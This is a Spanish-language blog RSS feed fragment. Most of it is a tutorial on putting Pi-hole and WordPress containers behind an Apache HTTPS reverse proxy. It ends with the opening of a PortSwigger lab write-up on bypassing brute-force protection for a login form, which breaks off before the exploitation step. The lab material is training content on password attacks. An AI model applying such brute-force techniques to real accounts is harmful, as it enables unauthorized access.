			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/resuelto_hu22080bf0a5932b0b041e8239aa680954_100189_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/resuelto_hu22080bf0a5932b0b041e8239aa680954_100189_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Multiples contenedores y Proxy Inverso Apache &#43; HTTPS</title>
        <link>https://www.alux.cc/p/multiples-contenedores-y-proxy-inverso-apache-https/</link>
        <pubDate>Sun, 21 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/multiples-contenedores-y-proxy-inverso-apache-https/</guid>
        <description>&lt;img src="https://www.alux.cc/p/multiples-contenedores-y-proxy-inverso-apache-https/head.png" alt="Featured image of post Multiples contenedores y Proxy Inverso Apache &#43; HTTPS" /&gt;&lt;h1 id=&#34;problema&#34;&gt;Problema&lt;/h1&gt;
&lt;p&gt;Actualmente cuento con un vps el cual uso muy poco pero queria utilizarlo mas seguido, por lo cual me di a la tarea de tener un dns el cual me bloquee todo el trafico malicioso o de publicidad, la primera opcion fue &lt;code&gt;Pi-Hole&lt;/code&gt; que utilice anteriormente aunque existen otras opciones como &lt;code&gt;Adguard Home&lt;/code&gt; pero que algun dia probare. Para esto queria que todo estuviera centralizado y no tener que acceder a traves de puertos a los servicios como pihole o algun otro docker que quiera levantar mas adelante. ya que no quiero acceder por dominio.com:port para cada servicio sino que segun lo que ingrese se me redirija hacia el puerto 443 automaticamente.&lt;/p&gt;
&lt;p&gt;Para eso lo que hare es que cuando se acceda a los siguientes dominios, sea automaticamente redirigido a un docker por el proxy reverso de apache y evitar colocar puertos y que se maneje todo por subdominios y forzando las comunicaciones a https.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://pi.dominio.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://pi.dominio.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://wordpress.dominio.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://wordpress.dominio.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;resolucion&#34;&gt;Resolucion&lt;/h1&gt;
&lt;p&gt;Para esto me apoyare del siguiente software para solucionar este problema.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Apache&lt;/li&gt;
&lt;li&gt;Docker&lt;/li&gt;
&lt;li&gt;Certbot&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;configuracion-de-contenedores-docker&#34;&gt;Configuracion de contenedores docker&lt;/h2&gt;
&lt;p&gt;Actualmente solo tengo 1 contenedor arriba, que es pihole pero hare un ejemplo si tuviera un wordpress adicional a este para poder acceder a traves del dominio y todos con un certificado de letsencrypt.&lt;/p&gt;
&lt;h3 id=&#34;pi-hole-container&#34;&gt;Pi-Hole Container&lt;/h3&gt;
&lt;p&gt;Para pihole existe el siguiente script para poder ejecutarlo, que lo que hara es levantar uno en el puerto 3141 de nuestro vps, pero sin exponerlo a toda internet.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# https://github.com/pi-hole/docker-pi-hole/blob/master/README.md&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;PIHOLE_BASE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;PIHOLE_BASE&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;:-$(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[[&lt;/span&gt; -d &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$PIHOLE_BASE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; mkdir -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$PIHOLE_BASE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Couldn&amp;#39;t create storage directory: &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$PIHOLE_BASE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; 1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Note: ServerIP should be replaced with your external ip.&lt;/span&gt;
docker run -d &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --name pihole &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    -p 53:53/tcp -p 53:53/udp &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    -p 127.0.0.1:3141:80 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    -e &lt;span class=&#34;nv&#34;&gt;TZ&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;America/Chicago&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    -v &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;PIHOLE_BASE&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/etc-pihole/:/etc/pihole/&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    -v &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;PIHOLE_BASE&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/etc-dnsmasq.d/:/etc/dnsmasq.d/&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --dns&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;127.0.0.1 --dns&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1.1.1.1 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --restart&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;unless-stopped &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --hostname pi.hole &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    -e &lt;span class=&#34;nv&#34;&gt;VIRTUAL_HOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pi.hole&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    -e &lt;span class=&#34;nv&#34;&gt;PROXY_LOCATION&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pi.hole&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    -e &lt;span class=&#34;nv&#34;&gt;ServerIP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    pihole/pihole:latest

&lt;span class=&#34;nb&#34;&gt;printf&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Starting up pihole container &amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i in &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;seq &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 20&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;docker inspect -f &lt;span class=&#34;s2&#34;&gt;&amp;#34;{{.State.Health.Status}}&amp;#34;&lt;/span&gt; pihole&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;healthy&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;printf&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39; OK&amp;#39;&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;\n&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;docker logs pihole 2&amp;gt; /dev/null &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;s1&#34;&gt;&amp;#39;password:&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; for your pi-hole: https://&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;IP&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/admin/&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
        sleep &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;printf&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; -eq &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;\nTimed out waiting for Pi-hole start, consult your container logs for more info (\`docker logs pihole\`)&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;wordpress-container&#34;&gt;Wordpress container&lt;/h3&gt;
&lt;p&gt;Ahora tenemos otro contenedor con wordpress que lo que hace es iniciar una instancia de word y siempre solamente local en el puerto 8002, para esto ya tenemos dos contenedores en los cuales trabajar.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;services&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;WordPress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;wordpress&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;links&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;mariadb:mysql&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;environment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;WORDPRESS_DB_PASSWORD=password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;ports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;m&#34;&gt;127.0.0.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;8001&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;volumes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;./html:/var/www/html&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;mariadb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;mariadb&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;environment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;MYSQL_ROOT_PASSWORD=password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;MYSQL_DATABASE=wordpress&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;volumes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;./database:/var/lib/mysql&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;generacion-de-certificados-de-ssl&#34;&gt;Generacion de certificados de SSL&lt;/h2&gt;
&lt;p&gt;Para esto utilizaremos certbot que nos solucionara la vida, ya que permitira descargar los certificados generados por letsencrypt en nuestra carpeta de archivos, todos estos se guardan en &lt;code&gt;/etc/letsencrypt/live/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Lo primero es en nuestro DNS agregar el CNAME de wordpress y pi apuntando a nuestra ip ya que certbot se basa en esto sino no dejara generar los certificados necesarios ya que hace una comprobacion de la ip y de nombre de DNS. Para esto los generamos con los siguientes comandos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;certbot certonly --apache -d pi.dominio.com
certbot certonly --apache -d wordpress.dominio.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Y si todo esta correctamente son guardados en la carpeta anterior mencionada, y desde ahi se podran importar a apache. Para configurar que las conexiones solo sean manejadas por HTTPS.&lt;/p&gt;
&lt;h2 id=&#34;configurar-apache-como-proxy-reverso&#34;&gt;Configurar Apache como proxy reverso&lt;/h2&gt;
&lt;p&gt;Para eso debemos de ejecutar las siguientes instrucciones con permisos de &lt;code&gt;root&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;apt install apache
a2enmod proxy       
a2enmod proxy_http
a2enmod proxy_balancer
a2enmod ssl
a2enmod rewrite
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lo que hara es instalar apache, habilitar los modulos necesarios para redireccion y que actue como gateway, permitir proxear y balancear todo, aparte el habilitar modulo de SSL para que las comunicaciones vayan cifradas por HTTPS y que se pueda redirigir a estas. Ahora solo queda desactivar el puerto 80 y manejar siempre por 443 que es HTTPS, para eso editamos el archivo &lt;code&gt;/etc/apache2/ports.conf&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf

#Listen 80

&amp;lt;IfModule ssl_module&amp;gt;
        Listen 443
&amp;lt;/IfModule&amp;gt;

&amp;lt;IfModule mod_gnutls.c&amp;gt;
        Listen 443
&amp;lt;/IfModule&amp;gt;

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ya que habilitamos e instalamos apache, vamos a lo siguiente que es agregar la configuracion para los sitios web a los que se quiere acceder:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd /etc/apache2/sites-available/
touch wordpress.conf
touch pihole.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Y en pihole.conf agregamos el siguiente texto que lo que hace es colocar el nombre del virtual host al que accederemos igual al nombre que se coloca en el DNS, la ip y puerto en la que esta expuesto que en nuestro caso es localhost y puerto 3141 y los certificados SSL anteriormente generados con certbot.&lt;/p&gt;
&lt;p&gt;pihole.conf&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;VirtualHost *:443&amp;gt;
    ProxyPreserveHost On
    ServerName pi.dominio.com
    ProxyPass / http://127.0.0.1:3141/
    ProxyPassReverse / http://127.0.0.1:3141/
    SSLEngine On
    SSLProxyEngine On
    SSLCertificateFile &amp;quot;/etc/letsencrypt/live/pi.dominio.com/cert.pem&amp;quot;
    SSLCertificateChainFile &amp;quot;/etc/letsencrypt/live/pi.dominio.com/chain.pem&amp;quot;
    SSLCertificateKeyFile &amp;quot;/etc/letsencrypt/live/pi.dominio.com/privkey.pem&amp;quot;
&amp;lt;/VirtualHost&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Para wordpress es similar y solo se cambia de puerto&lt;/p&gt;
&lt;p&gt;wordpress.conf&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;VirtualHost *:443&amp;gt;
    ProxyPreserveHost On
    ServerName wordpress.dominio.com
    ProxyPass / http://127.0.0.1:8001/
    ProxyPassReverse / http://127.0.0.1:8001/
    SSLEngine On
    SSLProxyEngine On
    SSLCertificateFile &amp;quot;/etc/letsencrypt/live/wordpress.dominio.com/cert.pem&amp;quot;
    SSLCertificateChainFile &amp;quot;/etc/letsencrypt/live/wordpress.dominio.com/chain.pem&amp;quot;
    SSLCertificateKeyFile &amp;quot;/etc/letsencrypt/live/wordpress.dominio.com/privkey.pem&amp;quot;
&amp;lt;/VirtualHost&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;teniendo esto ya solamente queda reiniciar apache o si ya lo habra pedido antes tambien hacerlo si es necesario.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;systemctl reload apache2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Y si accedemos a traves de internet a pi.dominio.com y wordpress.dominio.com ya deberia entrar sin problema y a traves de HTTPS con certificados de Lets Encrypt.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 6</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/</link>
        <pubDate>Sun, 21 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 6" /&gt;&lt;h1 id=&#34;lab-broken-brute-force-protection-multiple-credentials-per-request&#34;&gt;Lab: Broken brute-force protection, multiple credentials per request&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es ingresar con un usuario valido, como el que se nos indica que es &lt;code&gt;carlos&lt;/code&gt; y se nos da el listado de contrasenas que podemos probar.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Para resolver el ejercicio se nos da el listado de contrasenas con el que nos podemos autenticar con el usuario carlos, cuando tratamos de ingresar con el usuario se nos muestra una respuesta generica como la siguiente:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 200; 
			flex-basis: 480px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/login.png&#34; data-size=&#34;1101x550&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/login.png&#34;
			width=&#34;1101&#34;
			height=&#34;550&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/login_hu04338b439d24f74a8abf92495846d019_25375_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/login_hu04338b439d24f74a8abf92495846d019_25375_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder inicio de sesion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder inicio de sesion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Pero al ver la peticion, vemos que la peticion hace uso de post en formato &lt;code&gt;json&lt;/code&gt; de la siguiente manera:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;carlos&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
